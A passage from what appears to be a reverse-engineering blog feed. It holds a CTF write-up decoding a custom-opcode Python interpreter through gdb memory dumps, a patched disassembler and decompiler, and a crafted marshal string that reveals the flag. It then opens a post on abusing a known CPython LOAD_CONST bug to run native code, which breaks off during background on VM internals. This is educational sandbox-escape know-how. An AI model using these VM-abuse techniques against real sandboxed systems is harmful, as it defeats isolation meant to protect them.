part_1 = marshal.loads(&lsquo;c\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x14\x00\x00\x00d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00|\x00\x00\x1b(\x02\x00\x00\x00Ni\x01\x00\x00\x00(\x01\x00\x00\x00t\x04\x00\x00\x00True(\x01\x00\x00\x00t\x0e\x00\x00\x00Robert_Forsyth(\x00\x00\x00\x00(\x00\x00\x00\x00s\x10\x00\x00\x00obfuscate/gen.pyt\x03\x00\x00\x00foo\x05\x00\x00\x00s\x06\x00\x00\x00\x00\x01\x06\x02\n\x01&rsquo;)
part_1.co_code
&rsquo;d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00|\x00\x00\x1b'
part_1.co_varnames
(&lsquo;Robert_Forsyth&rsquo;,)
part_1.co_names
(&lsquo;True&rsquo;,)
```</p></blockquote></blockquote></blockquote>

<p>We can also go further by trying to create a function out of this code object, to call it and/or to disassemble it even:
```python fuu2</p>

<blockquote><blockquote><blockquote><p>from types import FunctionType
def a():
&hellip;     pass
&hellip;
f = FunctionType(part_1, a.func_globals)
f()
Traceback (most recent call last):
  File &ldquo;<stdin>&rdquo;, line 1, in <module>
  File &ldquo;obfuscate/gen.py&rdquo;, line 8, in foo
UnboundLocalError: local variable &lsquo;Robert_Forsyth&rsquo; referenced before assignment
import dis
dis.dis(f)
  6           0 LOAD_CONST               1 (1)</p>

<pre><code>          3 LOAD_CLOSURE             0
</code></pre>

<p>Traceback (most recent call last):
  File &ldquo;<stdin>&rdquo;, line 1, in <module>
  File &ldquo;/home/overclok/chall/ql-py/Python-2.7.8/Lib/dis.py&rdquo;, line 43, in dis</p>

<pre><code>disassemble(x)
</code></pre>

<p>  File &ldquo;/home/overclok/chall/ql-py/Python-2.7.8/Lib/dis.py&rdquo;, line 107, in disassemble</p>

<pre><code>print '(' + free[oparg] + ')',
</code></pre>

<p>IndexError: tuple index out of range
```</p></blockquote></blockquote></blockquote>

<h3>Introducing <em>dpy.py</em></h3>

<p>All right, as expected this does not work at all: seems like the custom interpreter uses different opcodes which the original virtual CPU doesn&rsquo;t know about.
Anyway, let&rsquo;s have a look at this object directly from memory because we like low level things (remember?):</p>

<p>```text inspecting the code object created
gdb$ p <em>(PyObject</em>)$rax
$3 = {ob_refcnt = 0x1, ob_type = 0x7d3da0 &lt;PyCode_Type>}</p>

<p>; Ok it is a code object, let&rsquo;s dump entirely the object now
gdb$ p <em>(PyCodeObject</em>)$rax
$4 = {
  ob_refcnt = 0x1,
  ob_type = 0x7d3da0 &lt;PyCode_Type>,
  co_argcount = 0x0, co_nlocals = 0x1, co_stacksize = 0x2, co_flags = 0x43,
  co_code = 0x7ffff7f09df0,
  co_consts = 0x7ffff7ee2908,
  co_names = 0x7ffff7f8e390,
  co_varnames = 0x7ffff7f09ed0,
  co_freevars = 0x7ffff7fa7050, co_cellvars = 0x7ffff7fa7050,
  co_filename = 0x7ffff70a9b58,
  co_name = 0x7ffff7f102b0,
  co_firstlineno = 0x5,
  co_lnotab = 0x7ffff7e59900,
  co_zombieframe = 0x0,
  co_weakreflist = 0x0
}
```</p>

<p>Perfect, and you can do that for every single field of this structure:</p>

<ul>
<li>to dump the bytecode,</li>
<li>the constants used,</li>
<li>the variable names,</li>
<li>etc.</li>
</ul>


<p>Yes, this is annoying, very much so. That is exactly why there is <em><a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a></em>, a <em>GDB</em> Python command I wrote to dump Python objects in a much easy way directly from memory:</p>

<p>```text show-casing dpy
gdb$ r
Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
[&hellip;]</p>

<blockquote><blockquote><blockquote><p>a = { 1 : [1,2,3], &lsquo;two&rsquo; : 31337, 3 : (1,&lsquo;lul&rsquo;, [3,4,5])}
print hex(id(a))
0x7ffff7ef1050
^C
Program received signal SIGINT, Interrupt.
gdb$ dpy 0x7ffff7ef1050
dict &ndash;> {1: [1, 2, 3], 3: (1, &lsquo;lul&rsquo;, [3, 4, 5]), &lsquo;two&rsquo;: 31337}
```</p></blockquote></blockquote></blockquote>

<h3>I need a disassembler now dad</h3>

<p>But let&rsquo;s get back to our second breakpoint now, and see what <em>dpy</em> gives us with the resulting code object:</p>

<p><code>text dpy code object
gdb$ dpy $rax
code -&gt; {'co_code': 'd\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00|\x00\x00\x1b',
 'co_consts': (None, 1),
 'co_name': 'foo',
 'co_names': ('True',),
 'co_varnames': ('Robert_Forsyth',)}
</code></p>

<p>Because we know the bytecode used by this interpreter is different than the original one, we have to figure out the equivalent between the instructions and their opcodes:</p>

<ol>
<li>Either we can reverse-engineer each handler of the virtual CPU,</li>
<li>Either we can create functions in both interpreters, disassemble those (thanks to <em>dpy</em>) and match the equivalent opcodes</li>
</ol>


<p>I guess we can mix both of them to be more efficient:</p>

<p>```text deducing equivalent opcodes
Python 2.7.8 (default, Sep  5 2014, 00:13:07)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>def assi(x):
&hellip;     x = &lsquo;hu&rsquo;
&hellip;
def add(x):
&hellip;     return x + 31337
&hellip;
import dis
dis.dis(assi)
  2           0 LOAD_CONST               1 (&lsquo;hu&rsquo;)</p>

<pre><code>          3 STORE_FAST               0 (x)
          6 LOAD_CONST               0 (None)
          9 RETURN_VALUE
</code></pre>

<p>dis.dis(add)
  2           0 LOAD_FAST                0 (x)</p>

<pre><code>          3 LOAD_CONST               1 (31337)
          6 BINARY_ADD
          7 RETURN_VALUE
</code></pre>

<p>assi.func_code.co_code
&rsquo;d\x01\x00}\x00\x00d\x00\x00S'
add.func_code.co_code
&lsquo;|\x00\x00d\x01\x00\x17S&rsquo;</p></blockquote></blockquote></blockquote>

<h1>In the custom interpreter</h1>

<p>gdb$ r
Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
[Thread debugging using libthread_db enabled]
Using host libthread_db library &ldquo;/lib/x86_64-linux-gnu/libthread_db.so.1&rdquo;.
Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>def assi(x):
&hellip;     x = &lsquo;hu&rsquo;
&hellip;
def add(x):
&hellip;     return x + 31337
&hellip;
print hex(id(assi))
0x7ffff7f0c578
print hex(id(add))
0x7ffff7f0c5f0
^C
Program received signal SIGINT, Interrupt.
gdb$ dpy 0x7ffff7f0c578
function &ndash;> {&lsquo;func_code&rsquo;: {&lsquo;co_code&rsquo;: &rsquo;d\x01\x00\x87\x00\x00d\x00\x00\x1b',</p>

<pre><code>           'co_consts': (None, 'hu'),
           'co_name': 'assi',
           'co_names': (),
           'co_varnames': ('x',)},
</code></pre>

<p> &lsquo;func_dict&rsquo;: None,
 &lsquo;func_doc&rsquo;: None,
 &lsquo;func_module&rsquo;: &lsquo;<strong>main</strong>&rsquo;,
 &lsquo;func_name&rsquo;: &lsquo;assi&rsquo;}
gdb$ dpy 0x7ffff7f0c5f0
function &ndash;> {&lsquo;func_code&rsquo;: {&lsquo;co_code&rsquo;: &lsquo;\x8f\x00\x00d\x01\x00=\x1b&rsquo;,</p>

<pre><code>           'co_consts': (None, 31337),
           'co_name': 'add',
           'co_names': (),
           'co_varnames': ('x',)},
</code></pre>

<p> &lsquo;func_dict&rsquo;: None,
 &lsquo;func_doc&rsquo;: None,
 &lsquo;func_module&rsquo;: &lsquo;<strong>main</strong>&rsquo;,
 &lsquo;func_name&rsquo;: &lsquo;add&rsquo;}</p></blockquote></blockquote></blockquote>

<p> # From here we have:
 # 0x64 &ndash;> LOAD_CONST
 # 0x87 &ndash;> STORE_FAST
 # 0x1b &ndash;> RETURN_VALUE
 # 0x8f &ndash;> LOAD_FAST
 # 0x3d &ndash;> BINARY_ADD
```</p>

<p>OK I think you got the idea, and if you don&rsquo;t manage to find all of them you can just debug the virtual CPU by putting a software breakpoint <em>@0x4b0960</em>:
<code>text opcode fetching
=&gt; 0x4b0923 &lt;PyEval_EvalFrameEx+867&gt;:   movzx  eax,BYTE PTR [r13+0x0]
</code></p>

<p>For the interested readers: there is at least one interesting opcode that you wouldn&rsquo;t find in a normal Python interpreter, check what <em>0xA0</em> is doing especially when followed by <em>0x87</em> :&ndash;).</p>

<h3>Back to the first marshaled function with all our tooling now</h3>

<p>Thanks to our <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/disassembler_ql_chall.py">disassembler.py</a>, we can now disassemble easily the first part:</p>

<p>```text disassembling
PS D:\Codes\ql-chall-python-2014> python .\disassembler_ql_chall.py
  6           0 LOAD_CONST               1 (1)</p>

<pre><code>          3 STORE_FAST               0 (Robert_Forsyth)
</code></pre>

<p>  8           6 LOAD_GLOBAL              0 (True)</p>

<pre><code>          9 LOAD_CONST               1 (1)
         12 INPLACE_ADD
         13 STORE_GLOBAL             0 (True)
</code></pre>

<p>  9          16 LOAD_GLOBAL              0 (True)</p>

<pre><code>         19 RETURN_VALUE
</code></pre>

<p>================================================================================
```</p>

<p>It seems the author has been really (too) kind with us: the function is really small and we can rewrite it in Python straightaway:</p>

<p>```python part_1
def part1():</p>

<pre><code>global True
Robert_Forsyth = 1
True += 1
</code></pre>

<p>```</p>

<p>You can also make sure with <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a> that the code of <em>part1</em> is the exact same than the unmarshaled function we dumped earlier.</p>

<p>```text part_1 successfully decompiled</p>

<blockquote><blockquote><blockquote><p>def part_1():
&hellip;  global True
&hellip;  Robert_Forsyth = 1
&hellip;  True += 1
&hellip;
print hex(id(part_1))
0x7ffff7f0f578
^C
Program received signal SIGINT, Interrupt.
gdb$ dpy 0x7ffff7f0f578
function &ndash;> {&lsquo;func_code&rsquo;: {&lsquo;co_code&rsquo;: &rsquo;d\x01\x00\x87\x00\x00|\x00\x00d\x01\x00&lt;a\x00\x00d\x00\x00\x1b',</p>

<pre><code>           'co_consts': (None, 1),
           'co_name': 'part_1',
           'co_names': ('True',),
           'co_varnames': ('Robert_Forsyth',)},
</code></pre>

<p> &lsquo;func_dict&rsquo;: None,
 &lsquo;func_doc&rsquo;: None,
 &lsquo;func_module&rsquo;: &lsquo;<strong>main</strong>&rsquo;,
 &lsquo;func_name&rsquo;: &lsquo;part_1&rsquo;}
```</p></blockquote></blockquote></blockquote>

<h3>Run my bytecode</h3>

<p>The second part is also quite simple according to the following disassembly:</p>

<p>```text run my bytecode
gdb$ disass run_me
Dump of assembler code for function run_me:
[&hellip;]
   ; Parses the arguments we gave, it expects a string object
   0x0000000000513da0 &lt;+16>:    lea    rcx,[rsp+0x10]
   0x0000000000513da5 &lt;+21>:    mov    rdx,rsp
   0x0000000000513da8 &lt;+24>:    call   0x4cf430 &lt;PyArg_ParseTuple>
   0x0000000000513dad &lt;+29>:    xor    edx,edx
   0x0000000000513daf &lt;+31>:    test   eax,eax
   0x0000000000513db1 &lt;+33>:    je     0x513e5e &lt;run_me+206></p>

<p>   0x0000000000513db7 &lt;+39>:    mov    rax,QWORD PTR [rip+0x2d4342]
   0x0000000000513dbe &lt;+46>:    mov    esi,0x91
   0x0000000000513dc3 &lt;+51>:    mov    edi,0x56c940
   0x0000000000513dc8 &lt;+56>:    mov    rax,QWORD PTR [rax+0x10]
   0x0000000000513dcc &lt;+60>:    mov    rbx,QWORD PTR [rax+0x30]</p>

<p>[&hellip;]
   ; Part1
[&hellip;]</p>

<p>   0x0000000000513df7 &lt;+103>:   mov    rsi,QWORD PTR [rsp+0x10]
   0x0000000000513dfc &lt;+108>:   mov    rdi,QWORD PTR [rsp]
   ; Uses the string passed as argument to run_me as a marshaled object
   ; PyObject<em> PyMarshal_ReadObjectFromString(char </em>string, Py_ssize_t len)
   0x0000000000513e00 &lt;+112>:   call   0x4dc020 &lt;PyMarshal_ReadObjectFromString></p>

<p>   0x0000000000513e05 &lt;+117>:   mov    rsi,rbx
   0x0000000000513e08 &lt;+120>:   mov    rdi,rax</p>

<p>   ; Creates a function out of it
   0x0000000000513e0b &lt;+123>:   call   0x52c630 &lt;PyFunction_New>
   0x0000000000513e10 &lt;+128>:   xor    edi,edi
   0x0000000000513e12 &lt;+130>:   mov    rbp,rax
   0x0000000000513e15 &lt;+133>:   call   0x478f80 &lt;PyTuple_New></p>

<p>   ; Calls it
   ; PyObject<em> PyObject_Call(PyObject </em>callable_object, PyObject <em>args, PyObject </em>kw)
   0x0000000000513e1a &lt;+138>:   xor    edx,edx
   0x0000000000513e1c &lt;+140>:   mov    rdi,rbp
   0x0000000000513e1f &lt;+143>:   mov    rsi,rax
   0x0000000000513e22 &lt;+146>:   call   0x422b40 &lt;PyObject_Call>
```</p>

<p>Basically, the string you pass to <em>run_me</em> is treated as a marshaled function: it explains why you get <em>segmentation faults</em> when you call the function with random strings.
We can just <em>jump over</em> that part of the function because we don&rsquo;t really need it so far: <em>set $eip=0x513e27</em> and job done!</p>

<h3>Second &amp; last marshaled function</h3>

<p>By the way I hope you are still reading &mdash; hold tight, we are nearly done!
Let&rsquo;s dump the function object with <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/dpy.py">dpy</a>:</p>

<p>```text Second part inspection with dpy
&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;[regs]
  RAX: 0x00007FFFF7FA7050  RBX: 0x00007FFFF7F0F758  RBP: 0x00000000007B0270  RSP: 0x00007FFFFFFFE040  o d I t s Z a P c
  RDI: 0x00007FFFF7F0F758  RSI: 0x00007FFFF7FA7050  RDX: 0x0000000000000000  RCX: 0x0000000000000828  RIP: 0x0000000000513E56
  R8 : 0x0000000000880728  R9 : 0x00007FFFF7F8D908  R10: 0x00007FFFF7FA7050  R11: 0x00007FFFF7FA7050  R12: 0x00007FFFF7FD0F48
  R13: 0x00000000007EF0A0  R14: 0x00007FFFF7F3CB00  R15: 0x00007FFFF7F07ED0
  CS: 0033  DS: 0000  ES: 0000  FS: 0000  GS: 0000  SS: 002B
&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;[code]</p>

<h2>=> 0x513e56 &lt;run_me+198>:       call   0x422b40 &lt;PyObject_Call></h2>

<p>gdb$ dpy $rdi
function &ndash;> {&lsquo;func_code&rsquo;: {&lsquo;co_code&rsquo;: &lsquo;\x7c\x00\x00\x64\x01\x00\x6b\x03\x00\x72\x19\x00\x7c\x00\x00\x64\x02\x00\x55\x61\x00\x00\x6e\x6e\x00\x7c\x01\x00\x6a\x02\x00\x64\x03\x00\x6a\x03\x00\x64\x04\x00\x77\x00\x00\xa0\x05\x00\xc8\x06\x00\xa0\x07\x00\xb2\x08\x00\xa0\x09\x00\xea\x0a\x00\xa0\x0b\x00\x91\x08\x00\xa0\x0c\x00\x9e\x0b\x00\xa0\x0d\x00\xd4\x08\x00\xa0\x0e\x00\xd5\x0f\x00\xa0\x10\x00\xdd\x11\x00\xa0\x07\x00\xcc\x08\x00\xa0\x12\x00\x78\x0b\x00\xa0\x13\x00\x87\x0f\x00\xa0\x14\x00\x5b\x15\x00\xa0\x16\x00\x97\x17\x00\x67\x1a\x00\x53\x86\x01\x00\x86\x01\x00\x86\x01\x00\x54\x64\x00\x00\x1b&rsquo;,
   &lsquo;co_consts&rsquo;: (None,</p>

<pre><code> 3,
 1,
 '',
 {'co_code': '\\x8f\\x00\\x00\\x5d\\x15\\x00\\x87\\x01\\x00\\x7c\\x00\\x00\\x8f\\x01\\x00\\x64\\x00\\x00\\x4e\\x86\\x01\\x00\\x59\\x54\\x71\\x03\\x00\\x64\\x01\\x00\\x1b',
  'co_consts': (13, None),
  'co_name': '&lt;genexpr&gt;',
  'co_names': ('chr',),
  'co_varnames': ('.0', '_')},
 75,
 98,
 127,
 45,
 89,
 101,
 104,
 67,
 122,
 65,
 120,
 99,
 108,
 95,
 125,
 111,
 97,
 100,
 110),
</code></pre>

<p>   &lsquo;co_name&rsquo;: &lsquo;foo&rsquo;,
   &lsquo;co_names&rsquo;: (&lsquo;True&rsquo;, &lsquo;quarkslab&rsquo;, &lsquo;append&rsquo;, &lsquo;join&rsquo;),
   &lsquo;co_varnames&rsquo;: ()},
 &lsquo;func_dict&rsquo;: None,
 &lsquo;func_doc&rsquo;: None,
 &lsquo;func_module&rsquo;: &lsquo;<strong>main</strong>&rsquo;,
 &lsquo;func_name&rsquo;: &lsquo;foo&rsquo;}
```</p>

<p>Even before studying / disassembling the code, we see some interesting things: <em>chr</em>, <em>quarkslab</em>, <em>append</em>, <em>join</em>, etc. It definitely feels like that function is generating the flag we are looking for.</p>

<p>Seeing <em>append</em>, <em>join</em> and another code object (in <em>co_consts</em>) suggests that a <em>generator</em> is used to populate the variable <em>quarkslab</em>. We also can guess that the bunch of bytes we are seeing may be the flag encoded/encrypted &mdash; anyway we can infer <strong>too much information to me</strong> just by dumping/looking at the object.</p>

<p>Let&rsquo;s use our magic <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/disassembler_ql_chall.py">disassembler.py</a> to see those codes objects:</p>

<p>```text part2 &amp; its generator disassembled
 19     >>    0 LOAD_GLOBAL              0 (True)</p>

<pre><code>          3 LOAD_CONST               1 (3)
          6 COMPARE_OP               3 (!=)
          9 POP_JUMP_IF_FALSE       25
</code></pre>

<p> 20          12 LOAD_GLOBAL              0 (True)</p>

<pre><code>         15 LOAD_CONST               2 (1)
         18 INPLACE_SUBTRACT
         19 STORE_GLOBAL             0 (True)
         22 JUMP_FORWARD           110 (to 135)
</code></pre>

<p> 22     >>   25 LOAD_GLOBAL              1 (quarkslab)</p>

<pre><code>         28 LOAD_ATTR                2 (append)
         31 LOAD_CONST               3 ('')
         34 LOAD_ATTR                3 (join)
         37 LOAD_CONST               4 (&lt;code object &lt;genexpr&gt; at 023A84A0, file "obfuscate/gen.py", line 22&gt;)
         40 MAKE_FUNCTION            0
         43 LOAD_CONST2              5 (75)
         46 LOAD_CONST3              6 (98)
         49 LOAD_CONST2              7 (127)
         52 LOAD_CONST5              8 (45)
         55 LOAD_CONST2              9 (89)
         58 LOAD_CONST4             10 (101)
         61 LOAD_CONST2             11 (104)
         64 LOAD_CONST6              8 (45)
         67 LOAD_CONST2             12 (67)
         70 LOAD_CONST7             11 (104)
         73 LOAD_CONST2             13 (122)
         76 LOAD_CONST8              8 (45)
         79 LOAD_CONST2             14 (65)
         82 LOAD_CONST10            15 (120)
         85 LOAD_CONST2             16 (99)
         88 LOAD_CONST9             17 (108)
         91 LOAD_CONST2              7 (127)
         94 LOAD_CONST11             8 (45)
         97 LOAD_CONST2             18 (95)
        100 LOAD_CONST12            11 (104)
        103 LOAD_CONST2             19 (125)
        106 LOAD_CONST16            15 (120)
        109 LOAD_CONST2             20 (111)
        112 LOAD_CONST14            21 (97)
        115 LOAD_CONST2             22 (100)
        118 LOAD_CONST15            23 (110)
        121 BUILD_LIST              26
        124 GET_ITER
        125 CALL_FUNCTION            1
        128 CALL_FUNCTION            1
        131 CALL_FUNCTION            1
        134 POP_TOP
    &gt;&gt;  135 LOAD_CONST               0 (None)
        138 RETURN_VALUE
</code></pre>

<p>================================================================================
 22           0 LOAD_FAST                0 (.0)</p>

<pre><code>    &gt;&gt;    3 FOR_ITER                21 (to 27)
          6 LOAD_CONST16             1 (None)
          9 LOAD_GLOBAL              0 (chr)
         12 LOAD_FAST                1 (_)
         15 LOAD_CONST               0 (13)
         18 BINARY_XOR
         19 CALL_FUNCTION            1
         22 YIELD_VALUE
         23 POP_TOP
         24 JUMP_ABSOLUTE            3
    &gt;&gt;   27 LOAD_CONST               1 (None)
         30 RETURN_VALUE
</code></pre>

<p>```</p>

<p>Great, that definitely sounds like what we described earlier.</p>

<h3>I need a decompiler dad</h3>

<p>Now because we really like to hack things, I decided to patch a Python decompiler to support the opcodes defined in this challenge in order to fully decompile the codes we saw so far.</p>

<p>I won&rsquo;t bother you with how I managed to do it though ; long story short: it is built it on top of <a href="https://github.com/gdelugre/fupy">fupy.py</a> which is a readable hackable Python 2.7 decompiler written by the awesome <a href="https://github.com/gdelugre">Guillaume Delugre</a> &mdash; Cheers to my mate <a href="https://twitter.com/Myst3rie">@Myst3rie</a> for telling about this project!</p>

<p>So here is <a href="https://github.com/0vercl0k/stuffz/blob/master/ql-chall-python-2014/decompiler_ql_chall.py">decompiler.py</a> working on the two code objects of the challenge:</p>

<p>```text decompiiiiiilation
PS D:\Codes\ql-chall-python-2014> python .\decompiler_ql_chall.py
PART1 ====================
Robert_Forsyth = 1
True = True + 1</p>

<p>PART2 ====================
if True != 3:</p>

<pre><code>True = True - 1
</code></pre>

<p>else:</p>

<pre><code>quarkslab.append(''.join(chr(_ ^ 13) for _ in [75, 98, 127, 45, 89, 101, 104, 45, 67, 104, 122, 45, 65, 120, 99, 108, 127, 45, 95, 104, 125, 120, 111, 97, 100, 110]))
</code></pre>

<p>```</p>

<p>Brilliant &mdash; time to get a flag now :&ndash;).
Here are the things we need to do:</p>

<ol>
<li>Set <em>True</em> to 2 (so that it&rsquo;s equal to 3 in the part 2)</li>
<li>Declare a <em>list</em> named <em>quarkslab</em></li>
<li>Jump over the middle part of the function where it will run the bytecode you gave as argument (or give a valid marshaled string that won&rsquo;t crash the interpreter)</li>
<li>Profit!</li>
</ol>


<p>```text win
overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
[GCC 4.8.2] on linux2
Type &ldquo;help&rdquo;, &ldquo;copyright&rdquo;, &ldquo;credits&rdquo; or &ldquo;license&rdquo; for more information.</p>

<blockquote><blockquote><blockquote><p>True = 2
quarkslab = list()
import do_not_run_me as v
v.run_me(&ldquo;c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00C\x00\x00\x00s\x04\x00\x00\x00d\x00\x00\x1B(\x01\x00\x00\x00N(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x07\x00\x00\x00rstdinrt\x01\x00\x00\x00a\x01\x00\x00\x00s\x02\x00\x00\x00\x00\x01&rdquo;)
quarkslab
[&lsquo;For The New Lunar Republic&rsquo;]
```</p></blockquote></blockquote></blockquote>

<h1>Conclusion</h1>

<p>This was definitely entertaining, so thanks to Serge and <a href="http://blog.quarkslab.com/">Quarkslab</a> for putting this challenge together! I feel like it would have been cooler to force people to write a disassembler or/and a decompiler to study the code of <em>run_me</em> though ; because as I mentioned at the very beginning of the article you don&rsquo;t really need any tool to guess/know roughly where the flag is, and how to get it. I still did write all those little scripts because it was fun and cool that&rsquo;s all!</p>

<p>Anyway, the codes I talked about are available on my github as usual if you want to have a look at them. You can also have look at <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/wildfire.py">wildfire.py</a> if you like weird/wild/whatever Python beasts!</p>

<p>That&rsquo;s all for today guys, I hope it wasn&rsquo;t too long and that you did enjoy the read.</p>

<p>By the way, we still think it would be cool to have more people posting on that blog, so if you are interested feel free to <a href="https://doar-e.github.io/about/">contact us</a>!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Deep dive into Python's VM: Story of LOAD_CONST bug]]></title>
    <link href="http://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/"/>
    <updated>2014-04-17T23:22:00-07:00</updated>
    <id>http://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug</id>
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>A year ago, I&rsquo;ve written a Python script to leverage a bug in Python&rsquo;s virtual machine: the idea was to fully control the Python virtual processor and after that to instrument the VM to execute native codes. The <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script wasn&rsquo;t really self-explanatory, so I believe only a few people actually took some time to understood what happened under the hood. The purpose of this post is to give you an explanation of the bug, how you can control the VM and how you can turn the bug into something that can be more useful. It&rsquo;s also a cool occasion to see how works the Python virtual machine from a low-level perspective: what we love so much right?</p>

<p>But before going further, I just would like to clarify a couple of things:</p>

<ul>
<li>I haven&rsquo;t found this bug, this is quite old and <strong>known</strong> by the Python developers (trading safety for performance), so don&rsquo;t panic this is <strong>not</strong> a 0day or a new bug ; can be a cool CTF trick though</li>
<li>Obviously, YES I know we can also &ldquo;escape&rdquo; the virtual machine with the <a href="http://docs.python.org/2/library/ctypes.html">ctypes</a> module ; but this is a feature not a bug. In addition, ctypes is always &ldquo;removed&rdquo;  from sandbox implementation in Python</li>
</ul>


<p>Also, keep in mind I will focus Python 2.7.5 x86 on Windows ; but obviously this is adaptable for other systems and architectures, so this is left as an exercise to the interested readers.
All right, let&rsquo;s move on to the first part: this one will focus the essentials about the VM, and Python objects.</p>

<div class='entry-content-toc'></div>




<!--more-->


<h1>The Python virtual processor</h1>

<h2>Introduction</h2>

<p>As you know, Python is a (really cool) scripting language interpreted, and the source of the official interpreter is available here: <a href="http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz">Python-2.7.6.tgz</a>. The project is written in C, and it is really readable ; so please download the sources, read them, you will learn a lot of things.
Now all the Python code you write is being <em>compiled</em>, at some point, into some &ldquo;bytecodes&rdquo;: let&rsquo;s say it&rsquo;s exactly the same when your C codes are compiled into x86 code. But the cool thing for us, is that the Python architecture is far more simpler than x86.</p>

<p>Here is a partial list of all available opcodes in Python 2.7.5:</p>

<p><code>text Python275 available opcodes
In [5]: len(opcode.opmap.keys())
Out[5]: 119
In [4]: opcode.opmap.keys()
Out[4]: [
 'CALL_FUNCTION',
 'DUP_TOP',
 'INPLACE_FLOOR_DIVIDE',
 'MAP_ADD',
 'BINARY_XOR',
 'END_FINALLY',
 'RETURN_VALUE',
 'POP_BLOCK',
 'SETUP_LOOP',
 'BUILD_SET',
 'POP_TOP',
 'EXTENDED_ARG',
 'SETUP_FINALLY',
 'INPLACE_TRUE_DIVIDE',
 'CALL_FUNCTION_KW',
 'INPLACE_AND',
 'SETUP_EXCEPT',
 'STORE_NAME',
 'IMPORT_NAME',
 'LOAD_GLOBAL',
 'LOAD_NAME',
 ...
]
</code></p>

<h2>The virtual machine</h2>

<p>The Python VM is fully implemented in the function <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a> that you can find in the <a href="https://github.com/python-git/python/blob/master/Python/ceval.c">ceval.c</a> file. The machine is built with a simple loop handling opcodes one-by-one with a bunch of switch-cases:</p>

<p>```c Python VM
PyObject *
PyEval_EvalFrameEx(PyFrameObject <em>f, int throwflag)
{
  //&hellip;
  fast_next_opcode:
  //&hellip;
  /</em> Extract opcode and argument */
  opcode = NEXTOP();
  oparg = 0;
  if (HAS_ARG(opcode))</p>

<pre><code>oparg = NEXTARG();
</code></pre>

<p>  //&hellip;
  switch (opcode)
  {</p>

<pre><code>case NOP:
  goto fast_next_opcode;

case LOAD_FAST:
  x = GETLOCAL(oparg);
  if (x != NULL) {
    Py_INCREF(x);
    PUSH(x);
    goto fast_next_opcode;
  }
  format_exc_check_arg(PyExc_UnboundLocalError,
    UNBOUNDLOCAL_ERROR_MSG,
    PyTuple_GetItem(co-&gt;co_varnames, oparg));
  break;

case LOAD_CONST:
  x = GETITEM(consts, oparg);
  Py_INCREF(x);
  PUSH(x);
  goto fast_next_opcode;

case STORE_FAST:
  v = POP();
  SETLOCAL(oparg, v);
  goto fast_next_opcode;

//...
</code></pre>

<p>  }
```</p>

<p>The machine also uses a virtual stack to pass/return object to the different opcodes. So it really looks like an architecture we are used to dealing with, nothing exotic.</p>

<h2>Everything is an object</h2>

<p>The first rule of the VM is that it handles only Python objects. A Python object is basically made of two parts:</p>

<ul>
<li>The first one is a header, this header is mandatory for all the objects. Defined like that:</li>
</ul>


<p>```c Python object header</p>

<h1>define PyObject_HEAD                   \</h1>

<p>  <em>PyObject_HEAD_EXTRA                \
  Py_ssize_t ob_refcnt;               \
  struct </em>typeobject *ob_type;</p>

<h1>define PyObject_VAR_HEAD               \</h1>

<p>  PyObject_HEAD                       \
  Py_ssize_t ob_size; /<em> Number of items in variable part </em>/
